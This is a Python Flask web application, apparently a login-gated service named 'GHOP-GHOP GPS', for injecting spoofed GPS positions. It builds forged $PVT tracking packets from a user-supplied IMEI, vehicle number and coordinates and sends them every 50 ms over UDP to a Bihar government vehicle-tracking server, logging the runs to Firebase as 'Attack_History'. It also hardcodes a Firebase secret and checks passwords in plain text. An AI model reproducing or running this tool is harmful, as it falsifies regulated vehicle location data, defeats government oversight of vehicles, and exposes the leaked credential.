import os, socket, threading, time, requests, random, uuid
from datetime import datetime, timedelta, timezone
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "nitro_v82_hybrid_final_fixed"

# --- FIREBASE CONFIG ---
FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"

TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "VLT", "GPS", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "EMR", "ROADRPA"]
NEW_SUFFIX = "0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041"
FIXED_CS = "DDE3"

user_sessions = {}

def get_ist_time():
    return datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)

def get_sid():
    return session.get('device_sid', 'guest')

# --- LOGIN HTML ---
LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - LOGIN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-box { border: 2px solid #0f0; padding: 30px; border-radius: 15px; background: #050505; box-shadow: 0 0 20px #0f0; width: 300px; text-align: center; }
        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; text-align: center; font-weight: bold; }
        .btn { padding: 12px; width: 100%; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>🫦 GHOP-GHOP GPS</h2>
        <form method="post">
            <input type="text" name="userid" placeholder="USER ID" required>
            <input type="password" name="password" placeholder="PASSWORD" required>
            <button class="btn">LOGIN</button>
        </form>
    </div>
</body>
</html>
"""

# --- DASHBOARD HTML ---
DASH_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - HYBRID MASTER</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
        .score-bar { background: #050505; border: 1px solid #0f0; width: 100%; max-width: 480px; padding: 10px; border-radius: 10px; display: flex; justify-content: space-around; font-size: 11px; margin-bottom: -10px; box-shadow: 0 0 10px #0f0; }
        .s-val { color: #fff; font-weight: bold; } .s-ok { color: #0f0; font-weight: bold; } .s-fail { color: #f00; font-weight: bold; }
        .box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; width: 100%; max-width: 480px; background: #050505; box-shadow: 0 0 20px #0f0; }
        #map { height: 250px; width: 100%; border: 1px solid #0f0; border-radius: 10px; margin-bottom: 15px; }
        .metric { font-size: 55px; color: #fff; margin: 5px 0; font-weight: bold; text-align: center; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        input { width: 92%; padding: 12px; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; font-weight: bold; }
        .full { grid-column: span 2; }
        .btn { padding: 15px; font-size: 16px; cursor: pointer; border: none; border-radius: 8px; width: 100%; font-weight: bold; text-transform: uppercase; margin-top: 5px; }
        .start { background: #008000; color: #fff; } .stop { background: #800; color: #fff; } .reset { background: #333; color: #fff; border: 1px solid #555; }
        .preview { background: #111; color: yellow; padding: 12px; font-size: 10px; word-break: break-all; margin-top: 10px; border: 1px dashed #0f0; min-height: 50px; }
    </style>
</head>
<body>
    <div class="score-bar">
        <span>TOTAL: <span id="s_total" class="s-val">0</span></span>
        <span>SUCCESS: <span id="s_ok" class="s-ok">0</span></span>
        <span>FAIL: <span id="s_fail" class="s-fail">0</span></span>
    </div>
    <div class="box">
        <div id="map"></div>
        <div class="metric" id="cnt">0</div>
        <form action="/action" method="post" class="grid">
            <div class="full"><input type="text" name="vno" id="vno" placeholder="VEHICLE NO" value="{{status.vno}}" oninput="this.value = this.value.toUpperCase();"></div>
            <div class="full"><input type="text" name="imei" id="imei" placeholder="IMEI" value="{{status.imei}}"></div>
            <div><input type="number" step="0.0000001" name="lat" id="lat" value="{{status.lat}}"></div>
            <div><input type="number" step="0.0000001" name="lon" id="lon" value="{{status.lon}}"></div>
            <div class="full"><div class="preview" id="preview">{{status.last_pkt}}</div></div>
            <button class="btn start full" name="btn" value="start">🚀 START HYBRID ENGINE</button>
            <button class="btn stop" name="btn" value="stop">🛑 STOP</button>
            <button class="btn reset" name="btn" value="reset">🔄 RESET</button>
        </form>
    </div>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        var map = L.map('map').setView([{{status.lat}}, {{status.lon}}], 13);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        var marker = L.marker([{{status.lat}}, {{status.lon}}]).addTo(map);

        setInterval(() => {
            fetch('/data').then(r => r.json()).then(d => {
                document.getElementById('cnt').innerText = d.count;
                document.getElementById('preview').innerText = d.last_pkt;
                if(d.score) {
                    document.getElementById('s_total').innerText = d.score.total || 0;
                    document.getElementById('s_ok').innerText = d.score.ok || 0;
                    document.getElementById('s_fail').innerText = d.score.fail || 0;
                }
            });
        }, 1000);
    </script>
</body>
</html>
"""

def log_to_firebase(uid, s):
    try:
        now = get_ist_time()
        log_data = {"Vehicle_No": s["vno"], "IMEI_No": s["imei"], "Lat": s["lat"], "Lon": s["lon"], "Start_Time": now.strftime('%H:%M:%S')}
        requests.put(f"{FB_URL}/Attack_History/{now.strftime('%Y-%m-%d')}/{uid}/{s['session_id']}_{s['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
        requests.put(f"{FB_URL}/Data_Records/{s['vno']}.json?auth={FB_SECRET}", json=log_data, timeout=5)
    except: pass

def firing_engine(sid):
    target = ("vlts.bihar.gov.in", 9999)
    while user_sessions.get(sid, {}).get("firing"):
        try:
            s = user_sessions[sid]
            tag = TAG_LIST[s["count"] % len(TAG_LIST)]
            now = get_ist_time()
            lat_f = "{:.7f}".format(float(s['lat']))
            lon_f = "{:.7f}".format(float(s['lon']))
            dt = now.strftime("%d%m%Y,%H%M%S")
            # POINT 3: \r \n INCLUDED
            pkt = f"$PVT,{tag},2.1.1,NR,01,L,{s['imei']},{s['vno']},1,{dt},{lat_f},N,{lon_f},E,{NEW_SUFFIX},{FIXED_CS}*"
            payload = pkt + " \r \n "
            user_sessions[sid]["last_pkt"] = pkt
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload.encode('ascii'), target)
            user_sessions[sid]["count"] += 1
            sock.close()
            time.sleep(0.05)
        except: time.sleep(1)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        uid, pw = request.form.get('userid'), request.form.get('password')
        u_data = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}").json()
        if u_data and str(u_data.get('password')) == str(pw):
            session['user'] = uid
            sid = str(uuid.uuid4())
            session['device_sid'] = sid
            user_sessions[sid] = {"uid": uid, "firing": False, "count": 0, "imei": "", "vno": "", "lat": "25.6489270", "lon": "84.7841180", "last_pkt": "Ready...", "session_id": ""}
            return redirect(url_for('dashboard'))
    return render_template_string(LOGIN_HTML)

@app.route('/dashboard')
def dashboard():
    sid = get_sid()
    if 'user' not in session or sid not in user_sessions: return redirect(url_for('login'))
    return render_template_string(DASH_HTML, status=user_sessions[sid])

@app.route('/action', methods=['POST'])
def action():
    sid, val = get_sid(), request.form.get('btn')
    if val == "start":
        user_sessions[sid].update({"firing": True, "session_id": get_ist_time().strftime('%H%M%S'), "imei": request.form.get('imei'), "vno": request.form.get('vno').upper(), "lat": request.form.get('lat'), "lon": request.form.get('lon')})
        log_to_firebase(session['user'], user_sessions[sid])
        threading.Thread(target=firing_engine, args=(sid,), daemon=True).start()
    elif val == "stop": user_sessions[sid]["firing"] = False
    elif val == "reset": user_sessions[sid].update({"firing": False, "count": 0, "imei": "", "vno": ""})
    return redirect(url_for('dashboard'))

@app.route('/data')
def data():
    sid = get_sid()
    if sid in user_sessions:
        today = get_ist_time().strftime('%Y-%m-%d')
        score = requests.get(f"{FB_URL}/User_Audit/{today}/{user_sessions[sid]['uid']}.json?auth={FB_SECRET}").json()
        user_sessions[sid]['score'] = score if score else {}
    return jsonify(user_sessions.get(sid, {}))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
